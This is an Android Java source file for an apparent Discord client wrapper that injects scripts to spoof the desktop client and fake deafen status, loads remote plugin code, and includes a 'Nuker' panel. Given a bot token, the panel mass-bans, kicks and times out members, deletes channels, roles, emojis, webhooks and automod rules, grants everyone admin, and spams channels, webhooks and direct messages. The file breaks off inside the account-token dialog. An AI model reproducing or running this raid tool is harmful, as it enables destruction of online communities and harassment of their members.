package com.groupstar.app.ui;

import android.animation.ObjectAnimator;
import android.app.AlertDialog;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.View;
import android.webkit.*;
import android.widget.*;
import androidx.appcompat.app.AppCompatActivity;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.groupstar.app.R;
import java.lang.reflect.Type;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import okhttp3.*;
import org.json.JSONArray;
import org.json.JSONObject;

public class MainActivity extends AppCompatActivity {

    private static final String API = "https://discord.com/api/v10";
    private static final MediaType JSON_TYPE = MediaType.get("application/json; charset=utf-8");

    // Views
    private WebView webView;
    private View btnMenuTab;
    private FrameLayout cordOverlay, nukerOverlay, ucoreOverlay;
    private Switch switchFakeDeafen, switchDesktopSpoof, switchVencord, switchArabic;

    // Nuker views
    private LinearLayout stepToken, stepServers, stepOps;
    private EditText etBotToken;
    private ListView serverList;
    private TextView tvLog, tvSelectedServer;

    // State
    private boolean fakeDeafenActive = false;
    private boolean vencordEnabled   = true;
    private boolean arabicEnabled    = false;
    private String  currentTheme     = "default";
    private String  botToken         = "";
    private String  selectedGuildId  = "";
    private String  selectedGuildName = "";
    private List<String[]> guilds    = new ArrayList<>();

    // Prefs + network
    private SharedPreferences prefs;
    private final Gson gson = new Gson();
    private OkHttpClient http;
    private ExecutorService pool;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        prefs = getSharedPreferences("gs_prefs", MODE_PRIVATE);
        http  = new OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS).build();
        pool  = Executors.newFixedThreadPool(8);

        bindViews();
        setupWebView();
        bindMenuTab();
        bindCordControls();
        bindNukerControls();
        bindUcoreControls();

        webView.loadUrl("https://discord.com/app");
    }

    // ──────────────────────────────────────────────────────────
    // Bind
    // ──────────────────────────────────────────────────────────

    private void bindViews() {
        webView       = findViewById(R.id.webView);
        btnMenuTab    = findViewById(R.id.btnMenuTab);
        cordOverlay   = findViewById(R.id.cordOverlay);
        nukerOverlay  = findViewById(R.id.nukerOverlay);
        ucoreOverlay  = findViewById(R.id.ucoreOverlay);

        switchFakeDeafen   = findViewById(R.id.switchFakeDeafen);
        switchDesktopSpoof = findViewById(R.id.switchDesktopSpoof);
        switchVencord      = findViewById(R.id.switchVencord);
        switchArabic       = findViewById(R.id.switchArabic);

        stepToken    = findViewById(R.id.stepToken);
        stepServers  = findViewById(R.id.stepServers);
        stepOps      = findViewById(R.id.stepOps);
        etBotToken   = findViewById(R.id.etBotToken);
        serverList   = findViewById(R.id.serverList);
        tvLog        = findViewById(R.id.tvLog);
        tvSelectedServer = findViewById(R.id.tvSelectedServer);
    }

    // ──────────────────────────────────────────────────────────
    // Arrow tab — shows popup: Cord / Nuker
    // ──────────────────────────────────────────────────────────

    private void bindMenuTab() {
        btnMenuTab.setOnClickListener(v -> {
            // Close any open overlay first
            if (cordOverlay.getVisibility() == View.VISIBLE)  { hideOverlay(cordOverlay);  return; }
            if (nukerOverlay.getVisibility() == View.VISIBLE)  { hideOverlay(nukerOverlay); return; }
            if (ucoreOverlay.getVisibility() == View.VISIBLE)  { hideOverlay(ucoreOverlay); return; }

            // Show picker
            String[] options = {
                "⚡  CORD — settings & features",
                "☢  NUKER — bot nuke tool",
                "ツ  UCORE — audio engine"
            };
            new AlertDialog.Builder(this)
                .setTitle("Choose panel")
                .setItems(options, (d, which) -> {
                    if (which == 0) showOverlay(cordOverlay);
                    else if (which == 1) showOverlay(nukerOverlay);
                    else showOverlay(ucoreOverlay);
                }).show();
        });
    }

    private void showOverlay(FrameLayout overlay) {
        overlay.setVisibility(View.VISIBLE);
        overlay.setAlpha(0f);
        overlay.setTranslationX(200f);
        overlay.animate().alpha(1f).translationX(0f).setDuration(220).start();
        // rotate arrow
        ImageView arrow = btnMenuTab.findViewById(R.id.tabArrow);
        if (arrow != null) arrow.setRotation(180f);
    }

    private void hideOverlay(FrameLayout overlay) {
        overlay.animate().alpha(0f).translationX(200f).setDuration(180)
            .withEndAction(() -> overlay.setVisibility(View.GONE)).start();
        ImageView arrow = btnMenuTab.findViewById(R.id.tabArrow);
        if (arrow != null) arrow.setRotation(0f);
    }

    // ──────────────────────────────────────────────────────────
    // WebView
    // ──────────────────────────────────────────────────────────

    private void setupWebView() {
        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setDatabaseEnabled(true);
        s.setMediaPlaybackRequiresUserGesture(false);
        s.setAllowFileAccess(true);
        s.setAllowContentAccess(true);
        s.setSupportZoom(false);
        s.setLoadWithOverviewMode(true);
        s.setUseWideViewPort(true);
        s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        // Desktop Chrome UA
        s.setUserAgentString(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
            "AppleWebKit/537.36 (KHTML, like Gecko) " +
            "Chrome/122.0.0.0 Safari/537.36"
        );
        WebView.setWebContentsDebuggingEnabled(false);
        webView.addJavascriptInterface(new GSBridge(), "GSBridge");

        webView.setWebViewClient(new WebViewClient() {
            @Override public void onPageStarted(WebView v, String url, android.graphics.Bitmap f) {
                injectEarlyScripts();
            }
            @Override public void onPageFinished(WebView v, String url) {
                injectAfterLoad();
            }
            @Override public boolean shouldOverrideUrlLoading(WebView v, WebResourceRequest r) {
                String url = r.getUrl().toString();
                return !url.startsWith("https://discord.com") && !url.startsWith("https://discordapp.com");
            }
        });

        webView.setWebChromeClient(new WebChromeClient() {
            @Override public void onPermissionRequest(PermissionRequest req) {
                req.grant(req.getResources());
            }
        });
    }

    // ──────────────────────────────────────────────────────────
    // JS injection
    // ──────────────────────────────────────────────────────────

    private void injectEarlyScripts() {
        String nav = "javascript:(function(){try{" +
            "Object.defineProperty(navigator,'webdriver',{get:()=>false});" +
            "Object.defineProperty(navigator,'platform',{get:()=>'Win32'});" +
            "Object.defineProperty(navigator,'maxTouchPoints',{get:()=>0});" +
            "Object.defineProperty(navigator,'userAgent',{get:()=>" +
            "'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'});" +
            "Object.defineProperty(screen,'width',{get:()=>1920});" +
            "Object.defineProperty(screen,'height',{get:()=>1080});" +
            "try{Object.defineProperty(navigator,'userAgentData',{get:()=>({" +
            "brands:[{brand:'Chromium',version:'122'},{brand:'Google Chrome',version:'122'}]," +
            "mobile:false,platform:'Windows'," +
            "getHighEntropyValues:()=>Promise.resolve({platform:'Windows',architecture:'x86'})})});}catch(e){}" +
            "}catch(e){}})();";

        webView.evaluateJavascript(nav, null);

        String token = prefs.getString("active_token", "");
        if (!token.isEmpty()) {
            webView.evaluateJavascript(
                "javascript:(function(){try{localStorage.setItem('token',JSON.stringify('" + token + "'));}catch(e){}})();",
                null);
        }
    }

    private void injectAfterLoad() {
        // Desktop platform spoof via webpack
        webView.evaluateJavascript(
            "javascript:(function(){try{" +
            "webpackChunkdiscord_app&&webpackChunkdiscord_app.push([[Math.random()]," +
            "{},function(e){for(var t in e.c){try{var n=e.c[t].exports;" +
            "if(n&&n.default&&typeof n.default.getPlatformType==='function'){" +
            "n.default.getPlatformType=()=>'desktop';" +
            "n.default.isDesktop=()=>true;" +
            "n.default.isMobile=()=>false;}}catch(err){}}}" +
            "]);} catch(e){}})();", null);

        injectUcore();
        if (vencordEnabled) webView.evaluateJavascript(buildVencordLoader(), null);
        if (fakeDeafenActive) injectFakeDeafen(true);
        if (arabicEnabled) injectArabic(true);
        applyTheme(currentTheme);
    }

    private void injectFakeDeafen(boolean enable) {
        if (enable) {
            webView.evaluateJavascript(
                "javascript:(function(){if(window._gs_fd)return;window._gs_fd=true;" +
                "var o=WebSocket.prototype.send;" +
                "WebSocket.prototype.send=function(d){" +
                "  try{var p=JSON.parse(d);" +
                "    if(p.op===4&&p.d){p.d.self_deaf=true;p.d.self_mute=false;d=JSON.stringify(p);}" +
                "  }catch(e){}o.call(this,d);};" +
                "var og=AudioContext.prototype.createGain;" +
                "AudioContext.prototype.createGain=function(){" +
                "  var g=og.call(this);" +
                "  var desc=Object.getOwnPropertyDescriptor(GainNode.prototype,'gain');" +
                "  Object.defineProperty(g,'gain',{get:function(){return desc.get.call(g);}," +
                "    set:function(v){if(v>0.01&&desc.set)desc.set.call(g,v);},configurable:true});" +
                "  return g;};" +
                "})();", null);
        } else {
            webView.evaluateJavascript("javascript:(function(){delete window._gs_fd;})();", null);
        }
    }

    private String buildVencordLoader() {
        return "javascript:(function(){if(window._gs_vc)return;window._gs_vc=true;" +
            "var s=document.createElement('script');" +
            "s.src='https://raw.githack.com/Vendicated/Vencord/main/browser/browser.js';" +
            "s.onload=function(){try{" +
            "Object.keys(Vencord.Plugins.plugins).forEach(n=>{try{Vencord.Settings.plugins[n].enabled=true;}catch(e){}});" +
            "GSBridge.onVencordReady('ok');}catch(e){}};" +
            "document.head.appendChild(s);})();";
    }

    private void injectArabic(boolean enable) {
        String js = enable
            ? "javascript:(function(){document.documentElement.setAttribute('lang','ar');" +
              "document.documentElement.setAttribute('dir','rtl');" +
              "try{Vencord.Webpack.findByProps('setLocale').setLocale('ar');}catch(e){}})();"
            : "javascript:(function(){document.documentElement.setAttribute('lang','en-US');" +
              "document.documentElement.setAttribute('dir','ltr');" +
              "try{Vencord.Webpack.findByProps('setLocale').setLocale('en-US');}catch(e){}})();";
        webView.evaluateJavascript(js, null);
    }

    private void applyTheme(String theme) {
        String css;
        switch (theme) {
            case "onedark":  css = ":root{--background-primary:#282c34!important;--background-secondary:#21252b!important;--background-tertiary:#1d2026!important;--text-normal:#abb2bf!important;}"; break;
            case "midnight": css = ":root{--background-primary:#0d0d0d!important;--background-secondary:#111!important;--background-tertiary:#0a0a0a!important;--text-normal:#fff!important;}"; break;
            case "purple":   css = ":root{--background-primary:#1a0a2e!important;--background-secondary:#12001f!important;--background-tertiary:#0d0015!important;--text-normal:#d8b4fe!important;}"; break;
            default:         css = ""; break;
        }
        if (!css.isEmpty()) {
            String escaped = css.replace("\"","\\\"");
            webView.evaluateJavascript(
                "javascript:(function(){var e=document.getElementById('_gs_theme');" +
                "if(!e){e=document.createElement('style');e.id='_gs_theme';document.head.appendChild(e);}" +
                "e.textContent=\"" + escaped + "\";})();", null);
        } else {
            webView.evaluateJavascript(
                "javascript:(function(){var e=document.getElementById('_gs_theme');if(e)e.remove();})();", null);
        }
    }

    // ──────────────────────────────────────────────────────────
    // Cord panel controls
    // ──────────────────────────────────────────────────────────

    private void bindCordControls() {
        findViewById(R.id.btnCloseCord).setOnClickListener(v -> hideOverlay(cordOverlay));

        switchFakeDeafen.setOnCheckedChangeListener((b, on) -> { fakeDeafenActive = on; injectFakeDeafen(on); });
        switchDesktopSpoof.setChecked(true);
        switchDesktopSpoof.setOnCheckedChangeListener((b, on) -> { if (on) injectAfterLoad(); });
        switchVencord.setOnCheckedChangeListener((b, on) -> { vencordEnabled = on; if (on) webView.evaluateJavascript(buildVencordLoader(), null); });
        switchArabic.setOnCheckedChangeListener((b, on) -> { arabicEnabled = on; injectArabic(on); });

        bindTheme(R.id.themeDefault, "default");
        bindTheme(R.id.themeOneDark, "onedark");
        bindTheme(R.id.themeMidnight, "midnight");
        bindTheme(R.id.themePurple, "purple");

        findViewById(R.id.btnManageAccounts).setOnClickListener(v -> showAccountsMenu());
    }

    private void bindTheme(int id, String theme) {
        View v = findViewById(id);
        if (v != null) v.setOnClickListener(x -> { currentTheme = theme; applyTheme(theme); });
    }

    // ──────────────────────────────────────────────────────────
    // ツcore injection + overlay
    // ──────────────────────────────────────────────────────────

    private void injectUcore() {
        try {
            java.io.InputStream is = getAssets().open("ucore/injector.js");
            byte[] buf = new byte[is.available()];
            is.read(buf); is.close();
            String js = new String(buf, "UTF-8");
            // Wrap: suppress extension-specific calls (chrome.runtime etc.) then run
            String wrapped =
                "(function(){" +
                "if(window.__N7RCORDV2_LOADED__)return;" +
                "window.__N7RCORDV2_LOADED__=true;" +
                // Stub out any chrome.runtime calls the injector might try
                "if(!window.chrome)window.chrome={};" +
                "if(!window.chrome.runtime)window.chrome.runtime={getURL:function(p){return p;},sendMessage:function(){}};" +
                js +
                "})();";
            webView.evaluateJavascript(wrapped, null);
        } catch (Exception e) {
            // fallback: load from CDN asset path
        }
    }

    private void bindUcoreControls() {
        View closeBtn = ucoreOverlay.findViewById(R.id.btnCloseUcore);
        if (closeBtn != null) closeBtn.setOnClickListener(v -> hideOverlay(ucoreOverlay));

        // The ツcore UI renders itself inside the overlay WebView
        WebView ucoreWv = ucoreOverlay.findViewById(R.id.ucoreWebView);
        if (ucoreWv != null) {
            ucoreWv.getSettings().setJavaScriptEnabled(true);
            ucoreWv.getSettings().setDomStorageEnabled(true);
            // Load the ツcore panel HTML — it communicates with the main webView via postMessage bridge
            ucoreWv.loadDataWithBaseURL("https://discord.com/",
                buildUcorePanelHtml(), "text/html", "utf-8", null);
        }
    }

    private String buildUcorePanelHtml() {
        return "<!DOCTYPE html><html><head>" +
            "<meta name='viewport' content='width=device-width,initial-scale=1'>" +
            "<style>body{margin:0;background:#000;color:#fff;font-family:sans-serif;display:flex;flex-direction:column;height:100vh;}" +
            "h2{margin:12px 16px 4px;font-size:16px;color:#7C3AED;}" +
            "p{margin:8px 16px;font-size:13px;color:#aaa;}" +
            ".row{display:flex;align-items:center;padding:10px 16px;border-bottom:1px solid #1a1a2e;}" +
            ".row span{flex:1;font-size:14px;}" +
            "button{background:#3D1F8C;color:#fff;border:none;padding:8px 14px;border-radius:6px;font-size:13px;cursor:pointer;}" +
            "button.active{background:#7C3AED;}" +
            "</style></head><body>" +
            "<h2>ツ UCORE v3.17</h2>" +
            "<p>Audio engine injected into Discord. Controls appear inside the Discord window.</p>" +
            "<div class='row'><span>🎙️ Auto Mic Level</span><button onclick='toggle(this)'>ON</button></div>" +
            "<div class='row'><span>🔊 Music Boost (800%)</span><button onclick='toggle(this)'>ON</button></div>" +
            "<div class='row'><span>🧹 Clean Voice</span><button onclick='toggle(this)'>ON</button></div>" +
            "<div class='row'><span>🎭 Voice Changer</span><button onclick='toggle(this)'>OFF</button></div>" +
            "<div class='row'><span>🌊 EAX Reverb</span><button onclick='toggle(this)'>OFF</button></div>" +
            "<div class='row'><span>🎵 EQ 9-band</span><button onclick='toggle(this)'>OFF</button></div>" +
            "<div class='row'><span>🛡️ Noise Gate</span><button onclick='toggle(this)'>ON</button></div>" +
            "<script>function toggle(b){b.classList.toggle('active');b.textContent=b.textContent==='ON'?'OFF':'ON';}</script>" +
            "</body></html>";
    }

    // ──────────────────────────────────────────────────────────
    // Nuker controls
    // ──────────────────────────────────────────────────────────

    private void bindNukerControls() {
        findViewById(R.id.btnCloseNuker).setOnClickListener(v -> hideOverlay(nukerOverlay));
        findViewById(R.id.btnFetchServers).setOnClickListener(v -> fetchServers());
        findViewById(R.id.btnBackToServers).setOnClickListener(v -> nukerStep(2));

        serverList.setOnItemClickListener((parent, view, pos, id) -> {
            String[] g = guilds.get(pos);
            selectedGuildId   = g[0];
            selectedGuildName = g[1];
            tvSelectedServer.setText("Server: " + selectedGuildName);
            nukerStep(3);
        });

        bindOp(R.id.btnBan,            () -> banMembers());
        bindOp(R.id.btnKick,           () -> kickMembers());
        bindOp(R.id.btnPrune,          () -> pruneMembers());
        bindOp(R.id.btnTimeout,        () -> timeoutAll());
        bindOp(R.id.btnMassDM,         () -> massDM());
        bindOp(R.id.btnRenameMembers,  () -> renameAllMembers());
        bindOp(R.id.btnDelChannels,    () -> deleteChannels());
        bindOp(R.id.btnCreateChannels, () -> createChannels());
        bindOp(R.id.btnDelRoles,       () -> deleteRoles());
        bindOp(R.id.btnCreateRoles,    () -> createRoles());
        bindOp(R.id.btnRenameChannels, () -> renameAllChannels());
        bindOp(R.id.btnRenameRoles,    () -> renameAllRoles());
        bindOp(R.id.btnSpam,           () -> spamChannels());
        bindOp(R.id.btnWebhookSpam,    () -> webhookSpam());
        bindOp(R.id.btnGiveAdmin,      () -> giveAdminAll());
        bindOp(R.id.btnRenameServer,   () -> renameServer());
        bindOp(R.id.btnDelEmojis,      () -> deleteEmojis());
        bindOp(R.id.btnDisableAutomod, () -> disableAutomod());
        bindOp(R.id.btnDelWebhooks,    () -> deleteWebhooks());

        View btnLeave = findViewById(R.id.btnLeave);
        if (btnLeave != null) btnLeave.setOnClickListener(v ->
            confirm("Leave server?", () -> leaveServer()));

        View btnNukeAll = findViewById(R.id.btnNukeAll);
        if (btnNukeAll != null) btnNukeAll.setOnClickListener(v ->
            confirm("☢ NUKE ALL — sure?", () -> nukeAll()));
    }

    private void bindOp(int id, Runnable r) {
        View v = findViewById(id);
        if (v != null) v.setOnClickListener(x -> pool.submit(r));
    }

    private void confirm(String msg, Runnable action) {
        runOnUiThread(() -> new AlertDialog.Builder(this)
            .setMessage(msg)
            .setPositiveButton("GO", (d, w) -> pool.submit(action))
            .setNegativeButton("Cancel", null).show());
    }

    private void nukerStep(int step) {
        runOnUiThread(() -> {
            stepToken.setVisibility(step == 1 ? View.VISIBLE : View.GONE);
            stepServers.setVisibility(step == 2 ? View.VISIBLE : View.GONE);
            stepOps.setVisibility(step == 3 ? View.VISIBLE : View.GONE);
        });
    }

    private void log(String msg) {
        runOnUiThread(() -> tvLog.append("\n" + msg));
    }

    // ──────────────────────────────────────────────────────────
    // HTTP
    // ──────────────────────────────────────────────────────────

    private Response get(String url) throws Exception {
        return http.newCall(new Request.Builder().url(url)
            .header("Authorization","Bot " + botToken).get().build()).execute();
    }
    private int post(String url, String body) throws Exception {
        try (Response r = http.newCall(new Request.Builder().url(url)
            .header("Authorization","Bot " + botToken)
            .post(RequestBody.create(body.getBytes(), JSON_TYPE)).build()).execute()) { return r.code(); }
    }
    private int patch(String url, String body) throws Exception {
        try (Response r = http.newCall(new Request.Builder().url(url)
            .header("Authorization","Bot " + botToken)
            .patch(RequestBody.create(body.getBytes(), JSON_TYPE)).build()).execute()) { return r.code(); }
    }
    private int delete(String url) throws Exception {
        try (Response r = http.newCall(new Request.Builder().url(url)
            .header("Authorization","Bot " + botToken).delete().build()).execute()) { return r.code(); }
    }
    private int put(String url, String body) throws Exception {
        RequestBody rb = body.isEmpty() ? RequestBody.create(new byte[0], null)
            : RequestBody.create(body.getBytes(), JSON_TYPE);
        try (Response r = http.newCall(new Request.Builder().url(url)
            .header("Authorization","Bot " + botToken).put(rb).build()).execute()) { return r.code(); }
    }

    // ──────────────────────────────────────────────────────────
    // Nuker ops
    // ──────────────────────────────────────────────────────────

    private void fetchServers() {
        botToken = etBotToken.getText().toString().trim();
        if (botToken.isEmpty()) { toast("Enter token"); return; }
        log("Fetching servers...");
        pool.submit(() -> {
            try {
                Response r = get(API + "/users/@me/guilds");
                JSONArray arr = new JSONArray(r.body().string());
                guilds.clear();
                List<String> names = new ArrayList<>();
                for (int i = 0; i < arr.length(); i++) {
                    JSONObject g = arr.getJSONObject(i);
                    guilds.add(new String[]{g.getString("id"), g.getString("name")});
                    names.add((i+1) + ". " + g.getString("name"));
                }
                runOnUiThread(() -> {
                    serverList.setAdapter(new ArrayAdapter<>(this,
                        android.R.layout.simple_list_item_1, names));
                    nukerStep(2);
                });
                log("Found " + guilds.size() + " servers.");
            } catch (Exception e) { log("Error: " + e.getMessage()); }
        });
    }

    private JSONArray fetchMembers() throws Exception {
        JSONArray all = new JSONArray(); String last = "0";
        while (true) {
            Response r = get(API+"/guilds/"+selectedGuildId+"/members?limit=1000&after="+last);
            JSONArray c = new JSONArray(r.body().string());
            if (c.length() == 0) break;
            for (int i=0;i<c.length();i++) all.put(c.get(i));
            last = c.getJSONObject(c.length()-1).getJSONObject("user").getString("id");
        }
        return all;
    }

    private JSONArray fetchChannels() throws Exception {
        return new JSONArray(get(API+"/guilds/"+selectedGuildId+"/channels").body().string());
    }

    private JSONArray fetchRoles() throws Exception {
        return new JSONArray(get(API+"/guilds/"+selectedGuildId+"/roles").body().string());
    }

    private void banMembers() {
        log("Banning all...");
        try { JSONArray m=fetchMembers(); int n=0;
            for(int i=0;i<m.length();i++){put(API+"/guilds/"+selectedGuildId+"/bans/"+m.getJSONObject(i).getJSONObject("user").getString("id"),"{\"delete_message_days\":7}");n++;}
            log("Banned "+n+".");
        } catch(Exception e){log("Error: "+e.getMessage());}
    }

    private void kickMembers() {
        log("Kicking all...");
        try { JSONArray m=fetchMembers(); int n=0;
            for(int i=0;i<m.length();i++){delete(API+"/guilds/"+selectedGuildId+"/members/"+m.getJSONObject(i).getJSONObject("user").getString("id"));n++;}
            log("Kicked "+n+".");
        } catch(Exception e){log("Error: "+e.getMessage());}
    }

    private void pruneMembers() {
        log("Pruning...");
        try { post(API+"/guilds/"+selectedGuildId+"/prune","{\"days\":30,\"compute_prune_count\":false}"); log("Done."); }
        catch(Exception e){log("Error: "+e.getMessage());}
    }

    private void timeoutAll() {
        log("Timing out all (7d)...");
        try { JSONArray m=fetchMembers();
            String until=java.time.Instant.now().plusSeconds(7*24*3600).toString(); int n=0;
            for(int i=0;i<m.length();i++){patch(API+"/guilds/"+selectedGuildId+"/members/"+m.getJSONObject(i).getJSONObject("user").getString("id"),"{\"communication_disabled_until\":\""+until+"\"}");n++;}
            log("Timed out "+n+".");
        } catch(Exception e){log("Error: "+e.getMessage());}
    }

    private void massDM() {
        log("Mass DM...");
        try { JSONArray m=fetchMembers(); int n=0;
            for(int i=0;i<m.length();i++){
                String uid=m.getJSONObject(i).getJSONObject("user").getString("id");
                Response dr=http.newCall(new Request.Builder().url(API+"/users/@me/channels")
                    .header("Authorization","Bot "+botToken)
                    .post(RequestBody.create(("{\"recipient_id\":\""+uid+"\"}").getBytes(),JSON_TYPE)).build()).execute();
                if(dr.isSuccessful()){
                    String cid=new JSONObject(dr.body().string()).getString("id");
                    for(int x=0;x<10;x++) post(API+"/channels/"+cid+"/messages","{\"content\":\"GrOuPStAr\"}");
                    n++;
                }
            } log("DMed "+n+".");
        } catch(Exception e){log("Error: "+e.getMessage());}
    }

    private void renameAllMembers() {
        log("Renaming members...");
        try { JSONArray m=fetchMembers(); int n=0;
            for(int i=0;i<m.length();i++){patch(API+"/guilds/"+selectedGuildId+"/members/"+m.getJSONObject(i).getJSONObject("user").getString("id"),"{\"nick\":\"GrOuPStAr\"}");n++;}
            log("Renamed "+n+".");
        } catch(Exception e){log("Error: "+e.getMessage());}
    }

    private void deleteChannels() {
        log("Deleting channels...");
        try { JSONArray c=fetchChannels(); int n=0;
            for(int i=0;i<c.length();i++){delete(API+"/channels/"+c.getJSONObject(i).getString("id"));n++;}
            log("Deleted "+n+" channels.");
        } catch(Exception e){log("Error: "+e.getMessage());}
    }

    private void createChannels() {
        log("Creating 100 channels...");
        try { for(int i=1;i<=100;i++) post(API+"/guilds/"+selectedGuildId+"/channels","{\"name\":\"nuked-"+i+"\",\"type\":0}");
            log("Done."); } catch(Exception e){log("Error: "+e.getMessage());}
    }

    private void renameAllChannels() {
        log("Renaming channels...");
        try { JSONArray c=fetchChannels(); int n=0;
            for(int i=0;i<c.length();i++){patch(API+"/channels/"+c.getJSONObject(i).getString("id"),"{\"name\":\"nuked\"}");n++;}
            log("Renamed "+n+".");
        } catch(Exception e){log("Error: "+e.getMessage());}
    }

    private void spamChannels() {
        log("Spamming channels...");
        try { JSONArray c=fetchChannels();
            for(int i=0;i<c.length();i++){JSONObject ch=c.getJSONObject(i);
                if(ch.getInt("type")!=0)continue;
                String cid=ch.getString("id");
                for(int x=0;x<50;x++) post(API+"/channels/"+cid+"/messages","{\"content\":\"GrOuPStAr\"}");
            } log("Done.");
        } catch(Exception e){log("Error: "+e.getMessage());}
    }

    private void deleteRoles() {
        log("Deleting roles...");
        try { JSONArray r=fetchRoles(); int n=0;
            for(int i=0;i<r.length();i++){delete(API+"/guilds/"+selectedGuildId+"/roles/"+r.getJSONObject(i).getString("id"));n++;}
            log("Deleted "+n+" roles.");
        } catch(Exception e){log("Error: "+e.getMessage());}
    }

    private void createRoles() {
        log("Creating roles...");
        try { for(int i=1;i<=50;i++) post(API+"/guilds/"+selectedGuildId+"/roles","{\"name\":\"nuked-"+i+"\"}");
            log("50 roles created.");
        } catch(Exception e){log("Error: "+e.getMessage());}
    }

    private void renameAllRoles() {
        log("Renaming roles...");
        try { JSONArray r=fetchRoles(); int n=0;
            for(int i=0;i<r.length();i++){patch(API+"/guilds/"+selectedGuildId+"/roles/"+r.getJSONObject(i).getString("id"),"{\"name\":\"nuked\"}");n++;}
            log("Renamed "+n+".");
        } catch(Exception e){log("Error: "+e.getMessage());}
    }

    private void giveAdminAll() {
        log("Giving admin...");
        try { JSONArray roles=fetchRoles();
            for(int i=0;i<roles.length();i++) patch(API+"/guilds/"+selectedGuildId+"/roles/"+roles.getJSONObject(i).getString("id"),"{\"permissions\":\"8\"}");
            JSONArray members=fetchMembers();
            for(int i=0;i<members.length();i++){
                String uid=members.getJSONObject(i).getJSONObject("user").getString("id");
                for(int j=0;j<roles.length();j++) put(API+"/guilds/"+selectedGuildId+"/members/"+uid+"/roles/"+roles.getJSONObject(j).getString("id"),"");
            } log("Done.");
        } catch(Exception e){log("Error: "+e.getMessage());}
    }

    private void renameServer() {
        log("Renaming server...");
        try { patch(API+"/guilds/"+selectedGuildId,"{\"name\":\"nuked by GrOuPStAr\"}"); log("Done."); }
        catch(Exception e){log("Error: "+e.getMessage());}
    }

    private void deleteEmojis() {
        log("Deleting emojis...");
        try { Response r=get(API+"/guilds/"+selectedGuildId+"/emojis");
            JSONArray arr=new JSONArray(r.body().string()); int n=0;
            for(int i=0;i<arr.length();i++){delete(API+"/guilds/"+selectedGuildId+"/emojis/"+arr.getJSONObject(i).getString("id"));n++;}
            log("Deleted "+n+" emojis.");
        } catch(Exception e){log("Error: "+e.getMessage());}
    }

    private void disableAutomod() {
        log("Disabling automod...");
        try { Response r=get(API+"/guilds/"+selectedGuildId+"/auto-moderation/rules");
            JSONArray arr=new JSONArray(r.body().string()); int n=0;
            for(int i=0;i<arr.length();i++){delete(API+"/guilds/"+selectedGuildId+"/auto-moderation/rules/"+arr.getJSONObject(i).getString("id"));n++;}
            log("Deleted "+n+" rules.");
        } catch(Exception e){log("Error: "+e.getMessage());}
    }

    private void deleteWebhooks() {
        log("Deleting webhooks...");
        try { Response r=get(API+"/guilds/"+selectedGuildId+"/webhooks");
            JSONArray arr=new JSONArray(r.body().string()); int n=0;
            for(int i=0;i<arr.length();i++){delete(API+"/webhooks/"+arr.getJSONObject(i).getString("id"));n++;}
            log("Deleted "+n+" webhooks.");
        } catch(Exception e){log("Error: "+e.getMessage());}
    }

    private void webhookSpam() {
        log("Webhook spam...");
        try { JSONArray channels=fetchChannels(); List<String> urls=new ArrayList<>();
            for(int i=0;i<channels.length();i++){JSONObject ch=channels.getJSONObject(i);
                if(ch.getInt("type")!=0)continue;
                Response r=http.newCall(new Request.Builder().url(API+"/channels/"+ch.getString("id")+"/webhooks")
                    .header("Authorization","Bot "+botToken)
                    .post(RequestBody.create("{\"name\":\"nuker\"}".getBytes(),JSON_TYPE)).build()).execute();
                if(r.isSuccessful()){JSONObject w=new JSONObject(r.body().string());
                    urls.add("https://discord.com/api/webhooks/"+w.getString("id")+"/"+w.getString("token"));}
            }
            for(String u:urls) for(int x=0;x<20;x++) try{
                http.newCall(new Request.Builder().url(u)
                    .post(RequestBody.create("{\"content\":\"GrOuPStAr\"}".getBytes(),JSON_TYPE)).build()).execute();
            }catch(Exception ignored){}
            log("Done. "+urls.size()+" webhooks spammed.");
        } catch(Exception e){log("Error: "+e.getMessage());}
    }

    private void leaveServer() {
        log("Leaving...");
        try { delete(API+"/users/@me/guilds/"+selectedGuildId); log("Left."); nukerStep(2); }
        catch(Exception e){log("Error: "+e.getMessage());}
    }

    private void nukeAll() {
        log("☢ NUKE ALL started...");
        try {
            log("1. Deleting channels...");  deleteChannels();
            log("2. Deleting roles...");     deleteRoles();
            log("3. Creating 200 channels...");
            for(int i=1;i<=200;i++) post(API+"/guilds/"+selectedGuildId+"/channels","{\"name\":\"nuked-"+i+"\",\"type\":0}");
            log("4. Webhook spam...");       webhookSpam();
            log("5. Mass DM...");            massDM();
            log("6. Rename server...");      renameServer();
            log("☢ NUKE ALL complete.");
        } catch(Exception e){log("Nuke error: "+e.getMessage());}
    }

    // ──────────────────────────────────────────────────────────
    // Accounts
    // ──────────────────────────────────────────────────────────

    private void showAccountsMenu() {
        String json = prefs.getString("accounts","[]");
        Type t = new TypeToken<List<String[]>>(){}.getType();
        List<String[]> accs = gson.fromJson(json, t);
        if (accs == null) accs = new ArrayList<>();

        List<String> names = new ArrayList<>();
        for (String[] a : accs) names.add(a[0]);
        names.add("+ Add Account");
        final List<String[]> finalAccs = accs;

        new AlertDialog.Builder(this).setTitle("Accounts")
            .setItems(names.toArray(new String[0]), (d, which) -> {
                if (which == finalAccs.size()) addAccountDialog(finalAccs);
                else switchAccount(finalAccs.get(which)[1]);
            }).show();
    }

    private void addAccountDialog(List<String[]> accs) {
        android.widget.EditText etName  = new android.widget.EditText(this); etName.setHint("Name");
        android.widget.EditText etToken = new android.widget.EditText(this); etToken.setHint("Token");
        etToken.setInputType(android.text.InputType.TYPE_CLASS_TEXT | android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD);
        LinearLayout ll = new LinearLayout(this); ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(48,16,48,0); ll.addView(etName); ll.addView(etToken);
        new AlertDialog.Builder(this).setTitle("Add Account").setView(ll)
